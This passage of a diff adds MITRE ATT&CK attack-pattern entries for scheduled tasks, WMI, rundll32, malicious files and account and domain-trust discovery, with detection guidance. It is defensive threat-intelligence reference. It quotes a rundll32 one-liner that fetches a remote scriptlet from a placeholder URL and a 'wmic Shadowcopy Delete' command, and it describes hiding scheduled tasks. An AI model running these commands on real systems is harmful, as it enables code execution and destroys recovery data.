+            "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "execution"
+                },
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "persistence"
+                },
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "privilege-escalation"
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "url": "https://attack.mitre.org/techniques/T1053/005",
+                    "external_id": "T1053.005"
+                },
+                {
+                    "source_name": "ProofPoint Serpent",
+                    "description": "Campbell, B. et al. (2022, March 21). Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain. Retrieved April 11, 2022.",
+                    "url": "https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain"
+                },
+                {
+                    "source_name": "Defending Against Scheduled Task Attacks in Windows Environments",
+                    "description": "Harshal Tupsamudre. (2022, June 20). Defending Against Scheduled Tasks. Retrieved July 5, 2022.",
+                    "url": "https://blog.qualys.com/vulnerabilities-threat-research/2022/06/20/defending-against-scheduled-task-attacks-in-windows-environments"
+                },
+                {
+                    "source_name": "Twitter Leoloobeek Scheduled Task",
+                    "description": "Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved September 12, 2024.",
+                    "url": "https://x.com/leoloobeek/status/939248813465853953"
+                },
+                {
+                    "source_name": "Tarrask scheduled task",
+                    "description": "Microsoft Threat Intelligence Team & Detection and Response Team . (2022, April 12). Tarrask malware uses scheduled tasks for defense evasion. Retrieved June 1, 2022.",
+                    "url": "https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/"
+                },
+                {
+                    "source_name": "Microsoft Scheduled Task Events Win10",
+                    "description": "Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.",
+                    "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events"
+                },
+                {
+                    "source_name": "TechNet Scheduled Task Events",
+                    "description": "Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.",
+                    "url": "https://technet.microsoft.com/library/dd315590.aspx"
+                },
+                {
+                    "source_name": "Red Canary - Atomic Red Team",
+                    "description": "Red Canary - Atomic Red Team. (n.d.). T1053.005 - Scheduled Task/Job: Scheduled Task. Retrieved June 19, 2024.",
+                    "url": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md"
+                },
+                {
+                    "source_name": "TechNet Autoruns",
+                    "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
+                    "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902"
+                },
+                {
+                    "source_name": "TechNet Forum Scheduled Task Operational Setting",
+                    "description": "Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.",
+                    "url": "https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen"
+                },
+                {
+                    "source_name": "SigmaHQ",
+                    "description": "Sittikorn S. (2022, April 15). Removal Of SD Value to Hide Schedule Task - Registry. Retrieved June 1, 2022.",
+                    "url": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_delete/registry_delete_schtasks_hide_task_via_sd_value_removal.yml"
+                },
+                {
+                    "source_name": "Stack Overflow",
+                    "description": "Stack Overflow. (n.d.). How to find the location of the Scheduled Tasks folder. Retrieved June 19, 2024.",
+                    "url": "https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_attack_spec_version": "3.2.0",
+            "x_mitre_contributors": [
+                "Andrew Northern, @ex_raritas",
+                "Bryan Campbell, @bry_campbell",
+                "Zachary Abzug, @ZackDoesML",
+                "Selena Larson, @selenalarson",
+                "Sittikorn Sangrattanapitak"
+            ],
+            "x_mitre_data_sources": [
+                "Windows Registry: Windows Registry Key Creation",
+                "File: File Modification",
+                "File: File Creation",
+                "Process: Process Creation",
+                "Command: Command Execution",
+                "Network Traffic: Network Traffic Flow",
+                "Scheduled Job: Scheduled Job Creation"
+            ],
+            "x_mitre_deprecated": false,
+            "x_mitre_detection": "Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.",
+            "x_mitre_domains": [
+                "enterprise-attack"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "x_mitre_permissions_required": [
+                "Administrator"
+            ],
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_remote_support": true,
+            "x_mitre_version": "1.6"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "created": "2017-05-31T21:30:44.329Z",
+            "modified": "2024-10-15T15:20:57.328Z",
+            "name": "Windows Management Instrumentation",
+            "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.\n\nThe WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "execution"
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "url": "https://attack.mitre.org/techniques/T1047",
+                    "external_id": "T1047"
+                },
+                {
+                    "source_name": "FireEye WMI 2015",
+                    "description": "Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.",
+                    "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf"
+                },
+                {
+                    "source_name": "Mandiant WMI",
+                    "description": "Mandiant. (n.d.). Retrieved February 13, 2024.",
+                    "url": "https://www.mandiant.com/resources/reports"
+                },
+                {
+                    "source_name": "WMI 6",
+                    "description": "Microsoft. (2022, June 13). BlackCat. Retrieved February 13, 2024.",
+                    "url": "https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/"
+                },
+                {
+                    "source_name": "WMI 1-3",
+                    "description": "Microsoft. (2023, March 7). Retrieved February 13, 2024.",
+                    "url": "https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page?redirectedfrom=MSDN"
+                },
+                {
+                    "source_name": "WMI 7,8",
+                    "description": "Microsoft. (2024, January 26). WMIC Deprecation. Retrieved February 13, 2024.",
+                    "url": "https://techcommunity.microsoft.com/t5/windows-it-pro-blog/wmi-command-line-wmic-utility-deprecation-next-steps/ba-p/4039242"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_attack_spec_version": "3.2.0",
+            "x_mitre_contributors": [
+                "@ionstorm",
+                "Olaf Hartong, Falcon Force",
+                "Tristan Madani"
+            ],
+            "x_mitre_data_sources": [
+                "Network Traffic: Network Connection Creation",
+                "Process: Process Creation",
+                "WMI: WMI Creation",
+                "Command: Command Execution"
+            ],
+            "x_mitre_deprecated": false,
+            "x_mitre_detection": "Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of \"wmic\" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)",
+            "x_mitre_domains": [
+                "enterprise-attack"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_remote_support": true,
+            "x_mitre_version": "1.5"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "created": "2020-01-23T18:03:46.248Z",
+            "modified": "2024-10-14T13:14:43.083Z",
+            "name": "Rundll32",
+            "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute.(Citation: Trend Micro CPL) For example, [ClickOnce](https://attack.mitre.org/techniques/T1127/002) can be proxied through Rundll32.exe.\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "url": "https://attack.mitre.org/techniques/T1218/011",
+                    "external_id": "T1218.011"
+                },
+                {
+                    "source_name": "rundll32.exe defense evasion",
+                    "description": "Ariel silver. (2022, February 1). Defense Evasion Techniques. Retrieved April 8, 2022.",
+                    "url": "https://www.cynet.com/attack-techniques-hands-on/defense-evasion-techniques/"
+                },
+                {
+                    "source_name": "Attackify Rundll32.exe Obscurity",
+                    "description": "Attackify. (n.d.). Rundll32.exe Obscurity. Retrieved August 23, 2021.",
+                    "url": "https://www.attackify.com/blog/rundll32_execution_order/"
+                },
+                {
+                    "source_name": "This is Security Command Line Confusion",
+                    "description": "B. Ancel. (2014, August 20). Poweliks \u2013 Command Line Confusion. Retrieved March 5, 2018.",
+                    "url": "https://www.stormshield.com/news/poweliks-command-line-confusion/"
+                },
+                {
+                    "source_name": "Github NoRunDll",
+                    "description": "gtworek. (2019, December 17). NoRunDll. Retrieved August 23, 2021.",
+                    "url": "https://github.com/gtworek/PSBits/tree/master/NoRunDll"
+                },
+                {
+                    "source_name": "Trend Micro CPL",
+                    "description": "Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.",
+                    "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_attack_spec_version": "3.2.0",
+            "x_mitre_contributors": [
+                "Gareth Phillips, Seek Ltd.",
+                "Casey Smith",
+                "Ricardo Dias",
+                "James_inthe_box, Me"
+            ],
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "Command: Command Execution",
+                "File: File Metadata",
+                "Module: Module Load"
+            ],
+            "x_mitre_defense_bypassed": [
+                "Digital Certificate Validation",
+                "Application control",
+                "Anti-virus"
+            ],
+            "x_mitre_deprecated": false,
+            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.\n\nCommand arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.",
+            "x_mitre_domains": [
+                "enterprise-attack"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "x_mitre_platforms": [
+                "Windows"
+            ],
+            "x_mitre_version": "2.3"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "created": "2020-03-11T14:49:36.954Z",
+            "modified": "2024-09-25T20:50:34.876Z",
+            "name": "Malicious File",
+            "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, and .reg.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "execution"
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "url": "https://attack.mitre.org/techniques/T1204/002",
+                    "external_id": "T1204.002"
+                },
+                {
+                    "source_name": "Password Protected Word Docs",
+                    "description": "Lawrence Abrams. (2017, July 12). PSA: Don't Open SPAM Containing Password Protected Word Docs. Retrieved January 5, 2022.",
+                    "url": "https://www.bleepingcomputer.com/news/security/psa-dont-open-spam-containing-password-protected-word-docs/"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_attack_spec_version": "3.2.0",
+            "x_mitre_contributors": [
+                "TruKno"
+            ],
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "File: File Creation"
+            ],
+            "x_mitre_deprecated": false,
+            "x_mitre_detection": "Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).",
+            "x_mitre_domains": [
+                "enterprise-attack"
+            ],
+            "x_mitre_is_subtechnique": true,
+            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "x_mitre_platforms": [
+                "Linux",
+                "macOS",
+                "Windows"
+            ],
+            "x_mitre_remote_support": false,
+            "x_mitre_version": "1.4"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "created": "2017-05-31T21:31:06.045Z",
+            "modified": "2020-01-31T19:01:41.919Z",
+            "name": "Rundll32",
+            "description": "The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.\n\nRundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "defense-evasion"
+                },
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "execution"
+                }
+            ],
+            "revoked": true,
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "url": "https://attack.mitre.org/techniques/T1085",
+                    "external_id": "T1085"
+                },
+                {
+                    "source_name": "Trend Micro CPL",
+                    "description": "Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.",
+                    "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf"
+                },
+                {
+                    "source_name": "This is Security Command Line Confusion",
+                    "description": "B. Ancel. (2014, August 20). Poweliks \u2013 Command Line Confusion. Retrieved March 5, 2018.",
+                    "url": "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_contributors": [
+                "Ricardo Dias",
+                "Casey Smith"
+            ],
+            "x_mitre_defense_bypassed": [
+                "Anti-virus",
+                "Application whitelisting",
+                "Digital Certificate Validation"
+            ],
+            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.",
+            "x_mitre_domains": [
+                "enterprise-attack"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "x_mitre_permissions_required": [
+                "User"
+            ],
+            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "x_mitre_version": "1.1",
+            "x_mitre_platforms": [
+                "Windows"
+            ]
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "created": "2017-05-31T21:31:06.988Z",
+            "modified": "2024-10-15T15:35:28.784Z",
+            "name": "Account Discovery",
+            "description": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](https://attack.mitre.org/techniques/T1078)).\n\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\n\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists.(Citation: AWS List Users)(Citation: Google Cloud - IAM Servie Accounts List API) On hosts, adversaries can use default [PowerShell](https://attack.mitre.org/techniques/T1059/001) and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system\u2019s files.",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "discovery"
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "url": "https://attack.mitre.org/techniques/T1087",
+                    "external_id": "T1087"
+                },
+                {
+                    "source_name": "AWS List Users",
+                    "description": "Amazon. (n.d.). List Users. Retrieved August 11, 2020.",
+                    "url": "https://docs.aws.amazon.com/cli/latest/reference/iam/list-users.html"
+                },
+                {
+                    "source_name": "Google Cloud - IAM Servie Accounts List API",
+                    "description": "Google. (2020, June 23). gcloud iam service-accounts list. Retrieved August 4, 2020.",
+                    "url": "https://cloud.google.com/sdk/gcloud/reference/iam/service-accounts/list"
+                },
+                {
+                    "source_name": "Elastic - Koadiac Detection with EQL",
+                    "description": "Stepanic, D.. (2020, January 13). Embracing offensive tooling: Building detections against Koadic using EQL. Retrieved November 30, 2020.",
+                    "url": "https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+            ],
+            "x_mitre_attack_spec_version": "3.2.0",
+            "x_mitre_contributors": [
+                "Daniel Stepanic, Elastic",
+                "Microsoft Threat Intelligence Center (MSTIC)",
+                "Travis Smith, Tripwire"
+            ],
+            "x_mitre_data_sources": [
+                "Process: Process Creation",
+                "Command: Command Execution",
+                "File: File Access"
+            ],
+            "x_mitre_deprecated": false,
+            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to enumerate user accounts, such as <code>net.exe</code> and <code>net1.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)",
+            "x_mitre_domains": [
+                "enterprise-attack"
+            ],
+            "x_mitre_is_subtechnique": false,
+            "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "x_mitre_platforms": [
+                "Windows",
+                "SaaS",
+                "IaaS",
+                "Linux",
+                "macOS",
+                "Office Suite",
+                "Identity Provider"
+            ],
+            "x_mitre_version": "2.5"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0",
+            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+            "created": "2019-02-14T16:15:05.974Z",
+            "modified": "2022-06-16T19:18:22.305Z",
+            "name": "Domain Trust Discovery",
+            "description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)",
+            "kill_chain_phases": [
+                {
+                    "kill_chain_name": "mitre-attack",
+                    "phase_name": "discovery"
+                }
+            ],
+            "external_references": [
+                {
+                    "source_name": "mitre-attack",
+                    "url": "https://attack.mitre.org/techniques/T1482",
+                    "external_id": "T1482"
+                },
+                {
+                    "source_name": "Microsoft Operation Wilysupply",
+                    "description": "Florio, E.. (2017, May 4). Windows Defender ATP thwarts Operation WilySupply software supply chain cyberattack. Retrieved February 14, 2019.",
+                    "url": "https://www.microsoft.com/security/blog/2017/05/04/windows-defender-atp-thwarts-operation-wilysupply-software-supply-chain-cyberattack/"
+                },
+                {
+                    "source_name": "AdSecurity Forging Trust Tickets",
+                    "description": "Metcalf, S. (2015, July 15). It\u2019s All About Trust \u2013 Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts. Retrieved February 14, 2019.",
+                    "url": "https://adsecurity.org/?p=1588"
+                },
+                {
+                    "source_name": "Microsoft Trusts",
+                    "description": "Microsoft. (2009, October 7). Trust Technologies. Retrieved February 14, 2019.",
+                    "url": "https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759554(v=ws.10)"
+                },
+                {
+                    "source_name": "Microsoft GetAllTrustRelationships",
+                    "description": "Microsoft. (n.d.). Domain.GetAllTrustRelationships Method. Retrieved February 14, 2019.",
